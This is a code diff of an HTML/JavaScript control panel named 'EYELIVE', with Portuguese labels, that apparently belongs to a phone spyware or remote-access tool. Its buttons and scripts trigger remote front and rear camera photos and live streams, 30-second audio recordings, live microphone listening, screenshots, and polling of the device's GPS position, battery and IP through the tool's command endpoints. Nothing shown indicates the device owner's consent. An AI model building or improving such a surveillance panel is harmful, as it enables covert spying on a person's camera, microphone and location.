@@ -7,140 +7,126 @@
         :root{--bg:#0d0d0d;--card:#1a1a1a;--gold:#ffd700;--green:#4caf50;--red:#f44336;--text:#fff;--sub:#aaa}
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:14px}
-        
         .header{background:#000;padding:15px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #222}
-        .header h1{font-size:1.3em;font-weight:700;color:#fff}
-        .header h1 span{color:var(--gold)}
+        .header h1{font-size:1.3em;font-weight:700}.header h1 span{color:var(--gold)}
         .status-dot{width:8px;height:8px;background:var(--green);border-radius:50%;display:inline-block;margin-right:6px}
-        
         .nav{display:flex;background:#111;border-bottom:1px solid #222;overflow-x:auto}
         .nav a{padding:14px 18px;color:var(--sub);text-decoration:none;font-size:.85em;white-space:nowrap;border-bottom:3px solid transparent}
         .nav a.active,.nav a:hover{color:var(--gold);border-bottom-color:var(--gold)}
-        
         .container{padding:15px;max-width:900px;margin:0 auto}
         .section-title{font-size:1.1em;font-weight:600;margin:20px 0 12px;padding-bottom:8px;border-bottom:1px solid #222;color:var(--gold)}
-        
-        .camera-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px}
-        @media(max-width:600px){.camera-grid{grid-template-columns:1fr}}
-        .cam-card{background:var(--card);border:1px solid #2a2a2a;border-radius:12px;overflow:hidden}
-        .cam-card .cam-header{padding:10px 15px;font-weight:600;font-size:.85em;border-bottom:1px solid #2a2a2a;display:flex;align-items:center;gap:8px}
-        .cam-card .cam-body{width:100%;height:220px;background:#000;display:flex;align-items:center;justify-content:center;color:#333;font-size:4em;overflow:hidden}
-        .cam-card .cam-body img{width:100%;height:100%;object-fit:cover}
-        .cam-card .cam-actions{padding:10px;display:flex;gap:8px}
-        
-        .btn{padding:8px 16px;border:none;border-radius:6px;font-weight:600;cursor:pointer;font-size:.8em;text-transform:uppercase}
-        .btn-cam{background:var(--gold);color:#000}.btn-live{background:var(--green);color:#fff}.btn-stop{background:var(--red);color:#fff}
-        
-        .card{background:var(--card);border:1px solid #2a2a2a;border-radius:12px;padding:15px;margin-bottom:15px}
-        
-        .map-placeholder{width:100%;height:250px;background:#111;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#444;font-size:2em}
-        
-        .msg-item{display:flex;align-items:flex-start;gap:12px;padding:12px 0;border-bottom:1px solid #1a1a1a}
-        .msg-avatar{width:36px;height:36px;border-radius:50%;background:#333;display:flex;align-items:center;justify-content:center;font-size:1.2em;flex-shrink:0}
-        .msg-content{flex:1}
-        .msg-name{font-weight:600;font-size:.85em}.msg-time{color:#666;font-size:.7em;float:right}
-        .msg-text{color:var(--sub);font-size:.8em;margin-top:3px;line-height:1.4}
-        
+        .cam-card{background:var(--card);border:1px solid #2a2a2a;border-radius:12px;overflow:hidden;margin-bottom:15px}
+        .cam-body{width:100%;height:250px;background:#000;display:flex;align-items:center;justify-content:center;color:#333;font-size:4em;overflow:hidden;position:relative}
+        .cam-body img{width:100%;height:100%;object-fit:cover}
+        .cam-actions{padding:10px;display:flex;gap:8px;flex-wrap:wrap}
+        .live-badge{position:absolute;top:10px;right:10px;background:var(--red);color:#fff;padding:5px 10px;border-radius:10px;font-size:.7em;animation:pulse 1s infinite}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+        .btn{padding:10px 18px;border:none;border-radius:6px;font-weight:600;cursor:pointer;font-size:.8em;text-transform:uppercase}
+        .btn-gold{background:var(--gold);color:#000}.btn-green{background:var(--green);color:#fff}.btn-red{background:var(--red);color:#fff}
         .tab-content{display:none}.tab-content.active{display:block}
         .info-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #1a1a1a;font-size:.85em}
         .info-row span:first-child{color:var(--sub)}.info-row span:last-child{color:#fff;font-weight:600}
+        .map-placeholder{width:100%;height:250px;background:#111;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#444;font-size:2em}
     </style>
 </head>
 <body>
-
-<div class="header">
-    <h1><span>EYE</span>LIVE</h1>
-    <span style="color:var(--green);font-size:.8em"><span class="status-dot"></span> {{DEVICE}}</span>
-</div>
-
+<div class="header"><h1><span>EYE</span>LIVE</h1><span style="color:var(--green);font-size:.8em"><span class="status-dot"></span> {{DEVICE}}</span></div>
 <div class="nav">
     <a href="#" class="active" onclick="tab('inicio',this)">🏠 Início</a>
-    <a href="#" onclick="tab('dispositivos',this)">📱 Dispositivos</a>
     <a href="#" onclick="tab('mapas',this)">🗺️ Mapas</a>
-    <a href="#" onclick="tab('historico',this)">📋 Histórico</a>
-    <a href="#" onclick="tab('arquivos',this)">📁 Arquivos</a>
+    <a href="#" onclick="tab('info',this)">📊 Info</a>
 </div>
-
 <div class="container">
-
-    <!-- INÍCIO -->
     <div id="tab-inicio" class="tab-content active">
-        <div class="section-title">📷 Câmera Frontal - Em Tempo Real</div>
+        
+        <div class="section-title">📷 Câmera Frontal</div>
         <div class="cam-card">
             <div class="cam-body" id="frontal-view"><span>📷</span></div>
             <div class="cam-actions">
-                <button class="btn btn-cam" onclick="foto('frontal')">📸 Capturar</button>
-                <button class="btn btn-live" onclick="live('frontal')">▶️ Live</button>
+                <button class="btn btn-gold" onclick="foto('frontal')">📸 Foto</button>
+                <button class="btn btn-green" onclick="live('frontal')">▶️ Live</button>
+                <button class="btn btn-red" onclick="pararLive('frontal')">⏹️ Parar</button>
             </div>
         </div>
         
-        <div class="section-title">📷 Câmera Traseira - Em Tempo Real</div>
+        <div class="section-title">📷 Câmera Traseira</div>
         <div class="cam-card">
             <div class="cam-body" id="traseira-view"><span>📷</span></div>
             <div class="cam-actions">
-                <button class="btn btn-cam" onclick="foto('traseira')">📸 Capturar</button>
-                <button class="btn btn-live" onclick="live('traseira')">▶️ Live</button>
+                <button class="btn btn-gold" onclick="foto('traseira')">📸 Foto</button>
+                <button class="btn btn-green" onclick="live('traseira')">▶️ Live</button>
+                <button class="btn btn-red" onclick="pararLive('traseira')">⏹️ Parar</button>
             </div>
         </div>
         
-        <div class="section-title">📱 Visualização de Tela ao Vivo</div>
+        <div class="section-title">🎤 Áudio</div>
+        <div class="cam-card">
+            <div class="cam-actions">
+                <button class="btn btn-red" onclick="audio()">🔴 Gravar 30s</button>
+                <button class="btn btn-green" onclick="audioLive()">🎧 Escuta ao Vivo</button>
+            </div>
+            <audio id="audioPlayer" controls style="width:100%;margin-top:10px;display:none"></audio>
+        </div>
+        
+        <div class="section-title">📱 Tela</div>
         <div class="cam-card">
             <div class="cam-body" style="height:280px" id="tela-view"><span>📱</span></div>
-            <div class="cam-actions">
-                <button class="btn btn-cam" onclick="cmd('screenshot')">📸 Screenshot</button>
-            </div>
-        </div>
-        
-        <div class="section-title">📍 Localização GPS Recente</div>
-        <div class="card">
-            <div class="map-placeholder">🗺️ Google Maps</div>
-            <div style="margin-top:10px">
-                <div class="info-row"><span>Latitude</span><span id="gps-lat">--</span></div>
-                <div class="info-row"><span>Longitude</span><span id="gps-lng">--</span></div>
-                <div class="info-row"><span>Atualizado</span><span id="gps-time">--</span></div>
-            </div>
-            <button class="btn btn-cam" onclick="cmd('gps')" style="width:100%;margin-top:10px">🔄 Atualizar GPS</button>
-        </div>
-        
-        <div class="section-title">💬 Últimas Mensagens</div>
-        <div class="card" id="msg-list">
-            <div class="msg-item"><div class="msg-avatar">S</div><div class="msg-content"><div class="msg-name">Sistema<span class="msg-time">Agora</span></div><div class="msg-text">Aguardando captura de mensagens...</div></div></div>
+            <div class="cam-actions"><button class="btn btn-gold" onclick="cmd('screenshot')">📸 Screenshot</button></div>
         </div>
     </div>
-
-    <!-- DISPOSITIVOS -->
-    <div id="tab-dispositivos" class="tab-content">
-        <div class="section-title">📱 Dispositivos Conectados</div>
-        <div id="device-list"><p style="color:var(--sub)">Carregando...</p></div>
-    </div>
-
-    <!-- MAPAS -->
+    
     <div id="tab-mapas" class="tab-content">
-        <div class="section-title">🗺️ Mapa em Tempo Real</div>
-        <div class="map-placeholder" style="height:400px">🗺️</div>
+        <div class="section-title">📍 GPS</div>
+        <div class="map-placeholder">🗺️</div>
+        <div style="margin-top:10px">
+            <div class="info-row"><span>Latitude</span><span id="gps-lat">--</span></div>
+            <div class="info-row"><span>Longitude</span><span id="gps-lng">--</span></div>
+        </div>
     </div>
-
-    <!-- HISTÓRICO -->
-    <div id="tab-historico" class="tab-content">
-        <div class="section-title">📋 Histórico de Atividades</div>
-        <div class="card"><p style="color:var(--sub)">Em desenvolvimento...</p></div>
+    
+    <div id="tab-info" class="tab-content">
+        <div class="section-title">📊 Dispositivo</div>
+        <div class="info-row"><span>Nome</span><span id="info-nome">--</span></div>
+        <div class="info-row"><span>Bateria</span><span id="info-bat">--</span></div>
+        <div class="info-row"><span>IP</span><span id="info-ip">--</span></div>
     </div>
-
-    <!-- ARQUIVOS -->
-    <div id="tab-arquivos" class="tab-content">
-        <div class="section-title">📁 Arquivos do Dispositivo</div>
-        <div class="card"><p style="color:var(--sub)">Em desenvolvimento...</p></div>
-    </div>
-
 </div>
 
 <script>
 var liveTimers={};
 function tab(t,el){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));document.getElementById('tab-'+t).classList.add('active');el.classList.add('active')}
 function foto(cam){fetch('/cmd/foto_'+cam).then(r=>r.json()).then(d=>alert(d.msg))}
-function live(cam){document.getElementById(cam+'-view').innerHTML='<img src="/live/'+cam+'?t='+Date.now()+'" id="live-'+cam+'">';liveTimers[cam]=setInterval(function(){var img=document.getElementById('live-'+cam);if(img)img.src='/live/'+cam+'?t='+Date.now()},3000)}
+function live(cam){
+    fetch('/cmd/live_'+cam);
+    document.getElementById(cam+'-view').innerHTML='<img src="/live/'+cam+'?t='+Date.now()+'" id="live-img-'+cam+'"><div class="live-badge">LIVE</div>';
+    liveTimers[cam]=setInterval(function(){
+        var img=document.getElementById('live-img-'+cam);
+        if(img)img.src='/live/'+cam+'?t='+Date.now();
+    },2000);
+}
+function pararLive(cam){
+    fetch('/cmd/parar_'+cam);
+    clearInterval(liveTimers[cam]);
+    document.getElementById(cam+'-view').innerHTML='<span>📷</span>';
+}
+function audio(){fetch('/cmd/audio').then(r=>r.json()).then(d=>alert(d.msg))}
+function audioLive(){
+    fetch('/cmd/audio_live').then(r=>r.json()).then(d=>{
+        alert(d.msg);
+        var player=document.getElementById('audioPlayer');
+        player.style.display='block';
+        player.src='/audio_live?t='+Date.now();
+        player.play();
+    });
+}
 function cmd(c){fetch('/cmd/'+c).then(r=>r.json()).then(d=>alert(d.msg||'OK'))}
-function update(){fetch('/api/status').then(r=>r.json()).then(d=>{document.getElementById('gps-lat').textContent=d.gps.lat;document.getElementById('gps-lng').textContent=d.gps.lng;document.getElementById('gps-time').textContent=d.ultimo_update})}
+function update(){fetch('/api/status').then(r=>r.json()).then(d=>{
+    document.getElementById('gps-lat').textContent=d.gps.lat;
+    document.getElementById('gps-lng').textContent=d.gps.lng;
+    document.getElementById('info-bat').textContent=d.bateria+(d.carregando?' [CARREGANDO]':'');
+    document.getElementById('info-ip').textContent=d.ip;
+    document.getElementById('info-nome').textContent=d.nome
+})}
 setInterval(update,5000);update()
 </script>
 </body>
